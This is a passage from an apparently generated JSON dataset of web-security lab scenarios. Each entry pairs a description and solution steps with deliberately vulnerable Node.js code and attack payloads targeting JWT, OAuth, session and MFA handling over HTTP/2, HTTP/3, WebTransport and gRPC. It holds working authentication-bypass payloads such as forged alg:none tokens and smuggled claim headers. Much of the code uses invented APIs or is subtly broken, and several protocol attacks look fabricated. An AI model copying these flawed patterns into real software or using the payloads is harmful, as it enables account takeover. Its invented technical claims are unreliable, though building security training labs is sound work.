    "srcCode": "const express = require('express');\nconst http2 = require('http2');\nconst jwt = require('jsonwebtoken');\nconst app = express();\napp.post('/admin', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  const claims = jwt.decode(token);\n  if (claims?.admin) {\n    res.send('Admin access granted');\n  } else {\n    res.status(403).send('Access denied');\n  }\n});\nconst server = http2.createSecureServer({\n  key: fs.readFileSync('server.key'),\n  cert: fs.readFileSync('server.crt')\n}, app);\nserver.on('stream', (stream, headers) => {\n  if (headers[':path']?.includes('admin=true')) {\n    headers.authorization = `Bearer ${jwt.sign({admin:true}, 'secret')}`;\n  }\n  const req = new http2.Http2ServerRequest(stream, headers);\n  const res = new http2.Http2ServerResponse(stream);\n  app(req, res);\n});\nserver.listen(443);",
    "payloads": [
      ":method: POST\n:path: /admin?claims={\"admin\":true}\n:authority: vulnerable-app.com\n:scheme: https\nauthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.Xzkx1J1W4-5VweniTgBlniWn4UwYp3lVJNcP3kYy7Y4",
      "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage through DNS-over-HTTPS cache poisoning",
    "Lab Description": "The lab's OAuth implementation is vulnerable to DNS cache poisoning via DNS-over-HTTPS (DoH) that leads to token leakage. The application uses DoH for redirect_uri validation but fails to properly cache responses, allowing redirection to attacker-controlled domains. To solve: poison the DoH cache to redirect OAuth tokens to a malicious domain.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify DoH server used by the application through subdomain enumeration",
      "Craft malicious DoH responses with short TTL for target domain",
      "Initiate OAuth flow during DoH cache window of opportunity",
      "Capture tokens when they're redirected to poisoned domain",
      "Exchange authorization code for access token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst dns = require('dns-over-http');\nconst app = express();\napp.get('/oauth/authorize', async (req, res) => {\n  const { redirect_uri } = req.query;\n  const { address } = await dns.query(new URL(redirect_uri).hostname, 'A');\n  if (address === 'legitimate.com') {\n    const code = 'oauth-code-' + Math.random().toString(36).substr(2);\n    res.redirect(`${redirect_uri}?code=${code}`);\n  } else {\n    res.status(400).send('Invalid redirect_uri');\n  }\n});\napp.listen(3000);",
    "payloads": [
      "https://vulnerable-app.com/oauth/authorize?response_type=code&client_id=client&redirect_uri=https://malicious.poisoned",
      "dig +short @dns.google.com malicious.poisoned A"
    ]
  },
  {
    "Lab scenario": "Session fixation via WebTransport session IDs",
    "Lab Description": "The lab's WebTransport implementation uses predictable session IDs that can be fixated before authentication. The application generates session tokens based on client-provided Session-ID headers without proper validation. To solve: predict and fixate a WebTransport session ID before authentication, then hijack the session after login.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Analyze WebTransport handshake to identify session ID generation pattern",
      "Predict next session ID based on observable sequence",
      "Initiate WebTransport connection with predicted session ID",
      "Complete authentication through normal HTTP flow",
      "Reuse WebTransport connection with elevated privileges"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { WebTransport } = require('@fails-components/webtransport');\nconst express = require('express');\nconst app = express();\nconst sessions = {};\nconst wt = new WebTransport({\n  port: 443,\n  server: app\n});\nwt.on('session', (session) => {\n  const id = session.headers.get('session-id') || Math.random().toString(36).substr(2);\n  sessions[id] = { authenticated: false };\n  session.on('data', (data) => {\n    if (sessions[id].authenticated) {\n      session.send('Privileged command executed');\n    }\n  });\n});\napp.post('/login', (req, res) => {\n  const { session } = req.body;\n  if (sessions[session]) {\n    sessions[session].authenticated = true;\n    res.json({ status: 'success' });\n  }\n});",
    "payloads": [
      "new WebTransport('https://vulnerable-app.com', { headers: { 'session-id': 'predictable123' } })",
      "fetch('/login', { method: 'POST', body: JSON.stringify({ session: 'predictable123' }) })"
    ]
  },
  {
    "Lab scenario": "MFA bypass via QUIC connection migration",
    "Lab Description": "The lab's MFA verification is vulnerable to bypass through QUIC connection migration. The application associates MFA state with QUIC connection IDs rather than authentication tokens. To solve: initiate MFA verification, then migrate QUIC connection to bypass verification while maintaining authenticated state.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture QUIC handshake using specialized packet capture tools",
      "Initiate MFA verification flow in one QUIC connection",
      "Migrate to new QUIC connection using different CID",
      "Bypass MFA verification while maintaining authenticated state",
      "Access privileged endpoints through migrated connection"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { QuicServer } = require('net');\nconst app = new QuicServer();\nconst mfaState = {};\napp.on('session', (session) => {\n  session.on('stream', (stream) => {\n    const cid = session.remote.address + ':' + session.remote.port;\n    if (stream.headers[':path'] === '/mfa/verify') {\n      mfaState[cid] = true;\n    }\n    if (mfaState[cid] || !stream.headers[':path'].startsWith('/admin')) {\n      stream.respond({ ':status': 200 });\n      stream.end('Access granted');\n    }\n  });\n});\napp.listen(443);",
    "payloads": [
      "quic://vulnerable-app.com/mfa/verify -migrate-connection",
      "quic://vulnerable-app.com/admin -reuse-connection"
    ]
  },
  {
    "Lab scenario": "JWT algorithm substitution via HTTP/3 connection migration",
    "Lab Description": "The lab's JWT validation is vulnerable to algorithm substitution when connections migrate between HTTP/3 and HTTP/2. The application fails to maintain consistent algorithm validation during protocol transitions. To solve: initiate authentication over HTTP/3, migrate to HTTP/2 mid-session, and substitute the algorithm header to bypass validation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use a QUIC-enabled client to establish HTTP/3 connection",
      "Intercept the JWT transmission using specialized protocol-aware proxy",
      "Force connection migration to HTTP/2 during token validation",
      "Modify the alg header during protocol transition",
      "Maintain valid signature while changing algorithm requirements"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { createQuicSocket } = require('net');\nconst jwt = require('jsonwebtoken');\nconst quicSocket = createQuicSocket({});\nasync function validateToken(token) {\n  const decoded = jwt.decode(token, {complete: true});\n  const alg = decoded?.header?.alg === 'HTTP3_RS256' ? 'RS256' : decoded?.header?.alg;\n  return jwt.verify(token, 'publicKey.pem', {algorithms: [alg]});\n}\nquicSocket.on('session', (session) => {\n  session.on('stream', (stream) => {\n    stream.on('data', (data) => {\n      const token = data.toString().match(/Bearer (\\S+)/)[1];\n      try {\n        validateToken(token);\n        stream.end('Access granted');\n      } catch (e) {\n        stream.end('Access denied');\n      }\n    });\n  });\n});\nquicSocket.listen({ key: 'key.pem', cert: 'cert.pem', alpn: 'h3' });",
    "payloads": [
      "GET /admin HTTP/3\nHost: vulnerable-app.com\nAuthorization: Bearer eyJhbGciOiJIVFRQMy1SUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.Signature",
      "Connection: migrate-to-http/2\nalg: none"
    ]
  },
  {
    "Lab scenario": "OAuth token hijacking via WebSocket subprotocol negotiation",
    "Lab Description": "The lab's OAuth implementation leaks tokens during WebSocket subprotocol negotiation. The application includes OAuth tokens in Sec-WebSocket-Protocol headers when negotiating subprotocols. To solve: intercept WebSocket handshake, manipulate subprotocol negotiation to capture tokens, and reuse them for API access.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept WebSocket connections using Burp Suite",
      "Modify Sec-WebSocket-Protocol header to trigger token leakage",
      "Capture OAuth token from error messages during negotiation",
      "Use stolen token to authenticate to REST API endpoints",
      "Access privileged user data through stolen token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const WebSocket = require('ws');\nconst wss = new WebSocket.Server({ port: 8080 });\nwss.on('connection', (ws, req) => {\n  const protocol = req.headers['sec-websocket-protocol'];\n  if (!protocol.includes('oauth-v1')) {\n    ws.close(1002, 'Invalid protocol: ' + protocol + ', valid: oauth-v1-<token>');\n    return;\n  }\n  const token = protocol.split('oauth-v1-')[1];\n  ws.on('message', (message) => {\n    ws.send('Authenticated as: ' + token);\n  });\n});",
    "payloads": [
      "GET /chat HTTP/1.1\nHost: vulnerable-app.com\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\nSec-WebSocket-Version: 13\nSec-WebSocket-Protocol: oauth-v1-",
      "Sec-WebSocket-Protocol: oauth-v1-<stolen_token>"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP Trailers header injection",
    "Lab Description": "The lab's session management is vulnerable to fixation through HTTP Trailers headers. The application processes session cookies from trailing headers after the main headers, allowing session override. To solve: craft a request with malicious session in Trailers header that overrides legitimate session after authentication.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept authentication flow using Burp Suite",
      "Add Trailers header with session fixation payload",
      "Include malicious session cookie in trailing headers",
      "Complete authentication to associate credentials with fixed session",
      "Access account using pre-set session identifier"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(require('body-parser').text({ type: '*/*' }));\nconst sessions = {};\napp.post('/login', (req, res) => {\n  const { user, pass } = req.body;\n  const session = req.headers['trailer-session'] || Math.random().toString(36).substr(2);\n  if (user === 'admin' && pass === 's3cr3t') {\n    sessions[session] = { user: 'admin' };\n    res.set('Trailer', 'Set-Cookie');\n    res.write('Logged in');\n    res.addTrailers({ 'Set-Cookie': `session=${session}` });\n    return res.end();\n  }\n  res.status(401).send('Invalid credentials');\n});\napp.get('/admin', (req, res) => {\n  const session = req.cookies.session;\n  if (sessions[session]?.user === 'admin') {\n    res.send('Admin access granted');\n  } else {\n    res.status(403).send('Access denied');\n  }\n});\napp.listen(3000);",
    "payloads": [
      "POST /login HTTP/1.1\nHost: vulnerable-app.com\nTrailer: Trailer-Session\nTransfer-Encoding: chunked\n\n5\nadmin\n6\ns3cr3t\n0\nTrailer-Session: fixed-session-123\n",
      "GET /admin HTTP/1.1\nHost: vulnerable-app.com\nCookie: session=fixed-session-123"
    ]
  },
  {
    "Lab scenario": "MFA bypass via WebTransport datagram fragmentation",
    "Lab Description": "The lab's MFA verification is vulnerable to bypass through WebTransport datagram fragmentation. The application fails to properly reassemble fragmented MFA codes sent over unreliable datagram channels. To solve: fragment MFA verification packets to trigger partial validation and bypass full code requirement.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Establish WebTransport connection to vulnerable endpoint",
      "Intercept MFA code submission using protocol-aware proxy",
      "Fragment MFA code into multiple unreliable datagrams",
      "Exploit race condition in code reassembly logic",
      "Gain authenticated access without complete valid code"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { WebTransport } = require('@fails-components/webtransport');\nconst wt = new WebTransport('https://localhost:4433/mfa-verify');\nconst codes = {};\nwt.ready.then(() => {\n  wt.datagrams.readable.pipeTo(new WritableStream({\n    write({ value }) {\n      const { id, code } = JSON.parse(value.toString());\n      if (!codes[id]) codes[id] = '';\n      codes[id] += code;\n      if (codes[id].length >= 6) {\n        if (codes[id] === '123456') {\n          wt.datagrams.send(new TextEncoder().encode('MFA Verified'));\n        } else {\n          delete codes[id];\n        }\n      }\n    }\n  }));\n});",
    "payloads": [
      "{\"id\":\"frag1\",\"code\":\"12\"}",
      "{\"id\":\"frag1\",\"code\":\"34\"}\n{\"id\":\"frag1\",\"code\":\"56\"}"
    ]
  },
  {
    "Lab scenario": "JWT claim smuggling via HTTP/2 trailer headers",
    "Lab Description": "The lab's JWT processing is vulnerable to claim smuggling through HTTP/2 trailer headers. The application processes trailer headers after initial JWT validation, allowing additional claims to be injected. To solve: craft an HTTP/2 request with malicious claims in trailer headers that override original JWT claims after validation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept HTTP/2 traffic using Burp Suite with HTTP/2 support enabled",
      "Modify request to include Trailer header with JWT claim overrides",
      "Add malicious claims in trailing headers after initial JWT",
      "Exploit timing difference between initial validation and trailer processing",
      "Verify admin access through smuggled claims"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst http2 = require('http2');\nconst jwt = require('jsonwebtoken');\nconst app = express();\napp.use(express.json());\nconst server = http2.createSecureServer({\n  key: fs.readFileSync('key.pem'),\n  cert: fs.readFileSync('cert.pem')\n}, app);\napp.post('/admin', (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  const decoded = jwt.verify(token, 'secret');\n  if (req.trailers['x-jwt-claims']) {\n    Object.assign(decoded, JSON.parse(req.trailers['x-jwt-claims']));\n  }\n  if (decoded.admin) {\n    res.send('Admin access granted');\n  } else {\n    res.status(403).send('Access denied');\n  }\n});\nserver.listen(443);",
    "payloads": [
      "POST /admin HTTP/2\nHost: vulnerable-app.com\nTrailer: X-JWT-Claims\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.Xzkx1J1W4-5VweniTgBlniWn4UwYp3lVJNcP3kYy7Y4\n\n0\nX-JWT-Claims: {\"admin\":true}\n",
      "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via HTTP/3 connection migration",
    "Lab Description": "The lab's OAuth implementation leaks tokens during HTTP/3 connection migration. The application fails to properly clear authentication state when connections migrate between networks. To solve: initiate OAuth flow on one network, force connection migration, and capture tokens from the new connection.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use QUIC-enabled client to establish HTTP/3 connection",
      "Initiate OAuth authorization on primary network interface",
      "Force connection migration by disabling primary interface",
      "Intercept token transmission on new network path",
      "Capture leaked tokens from migrated connection"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { createQuicSocket } = require('net');\nconst quicSocket = createQuicSocket({});\nquicSocket.listen({ key: 'key.pem', cert: 'cert.pem', alpn: 'h3' });\nquicSocket.on('session', (session) => {\n  session.on('stream', (stream) => {\n    let oauthToken = null;\n    stream.on('data', (chunk) => {\n      if (chunk.toString().includes('oauth_token')) {\n        oauthToken = chunk.toString().match(/oauth_token=([^&]+)/)[1];\n      }\n    });\n    stream.on('end', () => {\n      if (oauthToken && session.migrated) {\n        console.log('Token leaked after migration:', oauthToken);\n      }\n    });\n  });\n});",
    "payloads": [
      "GET /oauth/authorize?response_type=token HTTP/3\nHost: vulnerable-app.com\nConnection: migrate",
      "POST /oauth/token HTTP/3\nHost: vulnerable-app.com\nConnection: migrated"
    ]
  },
  {
    "Lab scenario": "Session fixation via WebSocket subprotocol downgrade",
    "Lab Description": "The lab's WebSocket implementation is vulnerable to session fixation through subprotocol downgrade attacks. The application maintains session state when downgrading from secure to insecure subprotocols. To solve: establish WebSocket with secure subprotocol, force downgrade, and fixate session identifier.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Establish WebSocket connection with wss:// and secure subprotocol",
      "Intercept connection using WebSocket proxy",
      "Modify handshake to force subprotocol downgrade",
      "Fixate session cookie during downgrade negotiation",
      "Reuse fixated session with elevated privileges"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const WebSocket = require('ws');\nconst wss = new WebSocket.Server({ port: 8080 });\nconst sessions = {};\nwss.on('connection', (ws, req) => {\n  const protocol = req.headers['sec-websocket-protocol'];\n  const session = req.headers.cookie?.match(/session=([^;]+)/)?.[1] || \n                 Math.random().toString(36).substr(2);\n  \n  if (protocol === 'secure-v1') {\n    sessions[session] = { authenticated: true };\n  } else if (protocol === 'insecure-v1' && sessions[session]) {\n    ws.send('Session maintained: ' + session);\n  }\n  \n  ws.on('message', (message) => {\n    if (sessions[session]?.authenticated) {\n      ws.send('Privileged action executed');\n    }\n  });\n});",
    "payloads": [
      "GET /chat HTTP/1.1\nHost: vulnerable-app.com\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\nSec-WebSocket-Version: 13\nSec-WebSocket-Protocol: secure-v1\nCookie: session=fixated-session-123",
      "GET /chat HTTP/1.1\nHost: vulnerable-app.com\nUpgrade: websocket\nConnection: Upgrade\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\nSec-WebSocket-Version: 13\nSec-WebSocket-Protocol: insecure-v1\nCookie: session=fixated-session-123"
    ]
  },
  {
    "Lab scenario": "MFA bypass via WebTransport stream multiplexing",
    "Lab Scenario": "The lab's MFA verification is vulnerable to bypass through WebTransport stream multiplexing. The application fails to properly isolate MFA verification streams from authenticated command streams. To solve: initiate MFA verification in one stream while sending privileged commands in another parallel stream.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Establish WebTransport connection to vulnerable endpoint",
      "Create separate bidirectional streams for MFA and commands",
      "Initiate MFA verification in primary stream",
      "Send privileged commands in parallel secondary stream",
      "Exploit race condition in stream isolation logic"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { WebTransport } = require('@fails-components/webtransport');\nconst wt = new WebTransport('https://localhost:4433/mfa');\nwt.ready.then(() => {\n  const mfaStream = wt.createBidirectionalStream();\n  const cmdStream = wt.createBidirectionalStream();\n  \n  const mfaWriter = mfaStream.writable.getWriter();\n  mfaWriter.write('START_MFA');\n  \n  const cmdWriter = cmdStream.writable.getWriter();\n  cmdWriter.write('PRIVILEGED_CMD');\n  \n  cmdStream.readable.pipeTo(new WritableStream({\n    write(chunk) {\n      console.log('Command response:', chunk.toString());\n    }\n  }));\n});",
    "payloads": [
      "stream 1: START_MFA\nstream 2: ADMIN_CMD",
      "stream 1: VERIFY_CODE_123456\nstream 2: GET_SENSITIVE_DATA"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion via HTTP/3 connection coalescing",
    "Lab Description": "The lab's JWT validation is vulnerable to algorithm confusion when HTTP/3 connections coalesce. The application fails to properly isolate cryptographic contexts when multiple hosts share an IP address. To solve: craft a JWT that appears as RS256 when validated by Host A but becomes HS256 when processed by Host B on the same IP.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify shared IP hosting using DNS and HTTP/3 server push",
      "Forge JWT with header that changes meaning between hosts",
      "Exploit connection coalescing to deliver different validation contexts",
      "Bypass signature validation through algorithm confusion",
      "Verify admin access through crafted token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { createQuicSocket } = require('net');\nconst jwt = require('jsonwebtoken');\nconst quicSocket = createQuicSocket({});\nquicSocket.listen({\n  key: 'key.pem',\n  cert: 'cert.pem',\n  alpn: 'h3',\n  maxConnectionsPerHost: 2\n});\nquicSocket.on('session', (session) => {\n  session.on('stream', (stream) => {\n    let token = '';\n    stream.on('data', (chunk) => {\n      const match = chunk.toString().match(/Bearer (\\S+)/);\n      if (match) token = match[1];\n    });\n    stream.on('end', () => {\n      try {\n        const decoded = jwt.verify(token, 'publicKey.pem', { algorithms: ['RS256', 'HS256'] });\n        if (decoded.admin) stream.end('Admin access granted');\n      } catch (e) {\n        stream.end('Access denied');\n      }\n    });\n  });\n});",
    "payloads": [
      "GET /admin HTTP/3\nHost: vulnerable-host-a.com\nAuthorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZX0.Signature",
      "GET /admin HTTP/3\nHost: vulnerable-host-b.com\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZX0.Signature"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via HTTP/2 PRIORITY_UPDATE frames",
    "Lab Description": "The lab's OAuth implementation leaks tokens in HTTP/2 PRIORITY_UPDATE frame metadata. The application includes sensitive tokens in stream priority weight calculations. To solve: manipulate stream dependencies to force token leakage in connection state updates.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept HTTP/2 traffic using specialized proxy",
      "Craft requests with malicious stream dependencies",
      "Force server to include tokens in PRIORITY_UPDATE frames",
      "Extract tokens from connection state changes",
      "Reuse stolen tokens for API access"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http2 = require('http2');\nconst server = http2.createSecureServer({\n  key: 'key.pem',\n  cert: 'cert.pem'\n});\nserver.on('stream', (stream, headers) => {\n  if (headers[':path'] === '/oauth/token') {\n    const token = 'sample-token-' + Math.random().toString(36).substr(2);\n    stream.respond({ ':status': 200 });\n    stream.end(JSON.stringify({ access_token: token }));\n    stream.priority({ weight: token.length });\n  }\n});\nserver.listen(443);",
    "payloads": [
      "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n",
      "GET /oauth/token HTTP/2\nHost: vulnerable-app.com\nConnection: dependency=token"
    ]
  },
  {
    "Lab scenario": "Session fixation via WebTransport DATAGRAM context switching",
    "Lab Scenario": "The lab's session management is vulnerable to fixation through WebTransport DATAGRAM context switching. The application associates sessions with DATAGRAM flow IDs but fails to clear them on reconnection. To solve: establish DATAGRAM flow, reconnect with same flow ID, and fixate privileged session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Establish WebTransport connection with DATAGRAM flow",
      "Authenticate and obtain privileged session",
      "Disconnect while maintaining flow ID state",
      "Reconnect with same flow ID to resume privileged session",
      "Execute commands with elevated privileges"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { WebTransport } = require('@fails-components/webtransport');\nconst wt = new WebTransport('https://localhost:4433/session');\nconst sessions = {};\nwt.ready.then(() => {\n  const datagramWriter = wt.datagrams.writable.getWriter();\n  datagramWriter.write('INIT_SESSION');\n  \n  wt.datagrams.readable.pipeTo(new WritableStream({\n    write({ value }) {\n      const [flowId, session] = value.toString().split(':');\n      sessions[flowId] = session;\n    }\n  }));\n  \n  wt.closed.then(() => {\n    setTimeout(() => {\n      const newWt = new WebTransport('https://localhost:4433/session', {\n        flowId: wt.flowId\n      });\n      newWt.ready.then(() => {\n        newWt.datagrams.writable.getWriter().write('PRIVILEGED_CMD');\n      });\n    }, 1000);\n  });\n});",
    "payloads": [
      "flowId: fixed-flow-123\nINIT_SESSION",
      "flowId: fixed-flow-123\nADMIN_CMD"
    ]
  },
  {
    "Lab scenario": "MFA bypass via HTTP Trailers in gRPC streaming",
    "Lab Description": "The lab's MFA verification is vulnerable to bypass through gRPC streaming trailer manipulation. The application processes MFA verification status in trailers but fails to validate them against the stream body. To solve: send valid MFA code in stream messages but override verification status in trailers.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept gRPC streaming connection",
      "Send valid MFA code in message body",
      "Inject malicious verification status in trailers",
      "Exploit timing difference between body and trailer processing",
      "Bypass MFA requirement while appearing compliant"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const grpc = require('@grpc/grpc-js');\nconst server = new grpc.Server();\nserver.addService(mfaProto.MFA.service, {\n  verify(call) {\n    let codeValid = false;\n    call.on('data', (message) => {\n      if (message.code === '123456') codeValid = true;\n    });\n    call.on('end', () => {\n      call.sendTrailers({\n        'mfa-verified': call.metadata.get('trailer-override')[0] || codeValid.toString()\n      });\n    });\n  }\n});\nserver.bindAsync('0.0.0.0:50051', grpc.ServerCredentials.createInsecure(), () => {\n  server.start();\n});",
    "payloads": [
      "message: { code: '123456' }\ntrailers: { 'trailer-override': 'true' }",
      "message: { code: '111111' }\ntrailers: { 'mfa-verified': 'true' }"
    ]
  },
  {
    "Lab scenario": "JWT validation bypass via HTTP/2 CONTINUATION frame injection",
    "Lab Description": "The lab's JWT validation is vulnerable to header splitting through HTTP/2 CONTINUATION frames. The application fails to properly reconstruct headers split across multiple CONTINUATION frames, allowing JWT claims to be smuggled. To solve: craft a request with malicious JWT claims in CONTINUATION frames that override the original token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept HTTP/2 traffic using Burp Suite with HTTP/2 support enabled",
      "Modify request to split Authorization header across CONTINUATION frames",
      "Inject malicious claims in subsequent CONTINUATION frames",
      "Bypass signature validation through header reconstruction flaws",
      "Verify admin access through smuggled claims"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http2 = require('http2');\nconst jwt = require('jsonwebtoken');\nconst server = http2.createSecureServer({\n  key: fs.readFileSync('key.pem'),\n  cert: fs.readFileSync('cert.pem')\n});\nserver.on('stream', (stream, headers) => {\n  let fullAuthHeader = headers[':authorization'] || '';\n  stream.on('continuation', (headers) => {\n    fullAuthHeader += headers[':authorization'] || '';\n  });\n  stream.on('end', () => {\n    const token = fullAuthHeader.split('Bearer ')[1];\n    const decoded = jwt.verify(token, 'secret');\n    if (decoded.admin) {\n      stream.respond({ ':status': 200 });\n      stream.end('Admin access granted');\n    }\n  });\n});\nserver.listen(443);",
    "payloads": [
      "HEADERS frame:\n:method: GET\n:path: /admin\n:authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\n\nCONTINUATION frame:\n:authorization: .eyJ1c2VyIjoiZ3Vlc3QifQ.Signature\n\nMALICIOUS CONTINUATION frame:\n:authorization: .eyJhZG1pbiI6dHJ1ZX0.Override",
      "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via HTTP/3 GREASE frames",
    "Lab Description": "The lab's OAuth implementation leaks tokens in HTTP/3 GREASE frame metadata. The application includes sensitive tokens in reserved frame type processing. To solve: craft GREASE frames that trigger token leakage in connection state updates.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept HTTP/3 traffic using QUIC-aware proxy",
      "Inject custom GREASE frames with token extraction payloads",
      "Force server to include tokens in unknown frame processing",
      "Extract tokens from connection state changes",
      "Reuse stolen tokens for API access"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { createQuicSocket } = require('net');\nconst quicSocket = createQuicSocket({});\nquicSocket.listen({\n  key: 'key.pem',\n  cert: 'cert.pem',\n  alpn: 'h3',\n  grease: true\n});\nquicSocket.on('session', (session) => {\n  session.on('grease', (frame) => {\n    if (frame.type === 0x1a1a) {\n      const token = frame.data.toString().match(/token=([^&]+)/)[1];\n      console.log('Extracted token:', token);\n    }\n  });\n});",
    "payloads": [
      "GREASE frame type: 0x1a1a\nPayload: token=leaked_oauth_token_123",
      "GET /oauth HTTP/3\nHost: vulnerable-app.com\nCustom-Grease: 1"
    ]
  },
  {
    "Lab scenario": "Session fixation via WebTransport stream priority inversion",
    "Lab Description": "The lab's session management is vulnerable to fixation through WebTransport stream priority manipulation. The application associates sessions with stream priorities but fails to validate them on stream recreation. To solve: create high-priority stream, fixate session, then recreate stream with same priority to resume session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Establish WebTransport connection with high-priority stream",
      "Authenticate and obtain privileged session",
      "Disconnect while noting stream priority",
      "Reconnect with same stream priority to resume session",
      "Execute commands with elevated privileges"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { WebTransport } = require('@fails-components/webtransport');\nconst wt = new WebTransport('https://localhost:4433/stream-priority');\nconst sessions = {};\nwt.ready.then(() => {\n  const stream = wt.createBidirectionalStream({ priority: 255 });\n  const writer = stream.writable.getWriter();\n  writer.write('AUTH_ADMIN');\n  \n  stream.readable.pipeTo(new WritableStream({\n    write(chunk) {\n      sessions[stream.priority] = chunk.toString();\n    }\n  }));\n  \n  setTimeout(() => {\n    const newStream = wt.createBidirectionalStream({ priority: 255 });\n    newStream.writable.getWriter().write('PRIVILEGED_CMD');\n  }, 1000);\n});",
    "payloads": [
      "stream priority: 255\nAUTH_ADMIN",
      "stream priority: 255\nGET_SENSITIVE_DATA"
    ]
  },
  {
    "Lab scenario": "MFA bypass via gRPC metadata compression oracle",
    "Lab Description": "The lab's MFA verification is vulnerable to bypass through gRPC metadata compression analysis. The application leaks verification status through compression ratios of error messages. To solve: analyze compression differences between valid and invalid MFA codes to derive correct code.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept gRPC traffic with compression enabled",
      "Send brute-force MFA codes and measure response sizes",
      "Identify compression ratio differences for valid codes",
      "Derive correct MFA code through statistical analysis",
      "Bypass MFA with derived code"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const grpc = require('@grpc/grpc-js');\nconst server = new grpc.Server();\nserver.addService(mfaProto.MFA.service, {\n  verify(call, callback) {\n    const code = call.request.code;\n    if (code === '654321') {\n      callback(null, { verified: true });\n    } else {\n      const error = new Error(`Invalid code ${code}. Please try again with a 6-digit code.`);\n      error.code = grpc.status.INVALID_ARGUMENT;\n      callback(error);\n    }\n  }\n});\nserver.bindAsync('0.0.0.0:50051', grpc.ServerCredentials.createInsecure(), () => {\n  server.start();\n});",
    "payloads": [
      "{\"code\":\"111111\"}",
      "{\"code\":\"222222\"}\n{\"code\":\"333333\"}\n{\"code\":\"444444\"}\n{\"code\":\"555555\"}\n{\"code\":\"666666\"}"
    ]
  },
  {
    "Lab scenario": "JWT alg:none bypass in REST API authentication",
    "Lab Description": "The application uses JWT for session management but fails to properly validate the algorithm. The vulnerable endpoint /api/admin accepts unsigned tokens when alg:none is specified. To solve: Forge an administrative JWT without knowing the secret key.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a valid JWT using Burp Suite and decode it in the JWT Editor extension",
      "Modify the algorithm header to 'none' and change the role to 'admin' in the payload",
      "Remove the signature section entirely (leave it empty after the second dot)",
      "Send the modified token to /api/admin endpoint using Postman",
      "Verify access to admin panel at /api/admin/dashboard"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\napp.get('/api/admin', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  const decoded = jwt.decode(token, {complete: true});\n  \n  if (decoded.header.alg === 'none') {\n    const payload = decoded.payload;\n    if (payload.role === 'admin') {\n      return res.json({access: 'granted'});\n    }\n  }\n  res.status(403).json({error: 'Forbidden'});\n});\n\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYXR0YWNrZXIiLCJyb2xlIjoiYWRtaW4ifQ.",
